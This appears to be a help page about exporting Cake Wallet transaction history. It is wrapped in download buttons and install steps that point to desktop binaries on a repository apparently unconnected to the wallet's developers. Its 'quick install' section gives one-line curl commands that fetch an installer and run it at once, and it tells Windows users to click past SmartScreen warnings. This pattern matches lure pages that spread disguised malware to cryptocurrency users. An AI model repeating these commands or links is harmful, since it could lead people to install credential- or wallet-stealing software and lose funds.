![Cake Wallet export transaction history guide](assets/cake-wallet-export-transaction-history-article-banner.png)

# Export Cake Wallet Transaction History

What the CSV contains, and what it cannot prove on its own.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Open the wallet, find the transaction history export, and save the file it produces. The export lists the transactions that wallet knows about, with amounts, addresses and timestamps. It is a record for accounting or reconciliation, not a tax calculation, and it reflects the wallet's own view of the chain.

<!-- ARTICLE-BODY-BEGIN -->

## What the export contains
The file covers one wallet, not the whole app. If you hold several wallets, export each one; if you hold several Monero accounts, check whether the export includes them or only the open account.

Amounts are recorded in the coin's own units, with the fee and the counterparty address where the wallet knows it. That is enough to reconcile against an explorer and not enough to satisfy a tax authority without conversion work of your own.

## What an export reveals
The file is a complete map of your addresses and amounts for that wallet. Treat it like a bank statement: fine to hand to an accountant, careless to post in a support thread.

Privacy matters here more than with a custodial account, because the addresses in the file are yours on-chain. Cake Wallet KYC and anonymity covers how that record relates to identity, which depends on how the coins arrived.

## Exporting from the current build
Export behaviour and file format belong to the app version, and an older build may not offer the option at all. Install the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a> and export afterwards, so the file matches the history the app is showing.

If the export is empty for a wallet that clearly has history, the wallet is probably still syncing. Wait for the sync to complete rather than exporting twice.

## Reconciling against an explorer
A row that looks wrong is usually a fee, a pending transaction or a transfer that is part of a larger transaction. Check the transaction ID on an explorer before you conclude the export is wrong.

The wallet's view and the chain's view should match once the wallet is synced. A mismatch that persists is a reason to rescan rather than to edit the file.

## Labelling saved addresses
An export is far easier to read when the addresses in it have names you recognise. The address book is where those labels live, and they carry into the history view.

<a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-address-book.md">Use the Cake Wallet address book</a> covers saving and checking an entry, which also reduces the mis-sends that make a history file confusing later.

## What it is for
The export answers "what did this wallet do" for accounting, for a dispute, or for your own records. It does not answer "what is this worth today" or "what do I owe", because both need prices and rules that the wallet does not supply.

Treating the CSV as a starting point rather than a finished return is the honest use. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-what-it-is.md">What Cake Wallet is</a> explains the non-custodial model that makes the export yours to keep in the first place.

## FAQ
### How do I export my transaction history?
Open the wallet, find the export option in its history or settings area, and save the generated file.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[what Cake Wallet is](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-what-it-is.md) · [use the Cake Wallet address book](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-address-book.md) · [Cake Wallet KYC and anonymity](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-kyc-anonymous.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
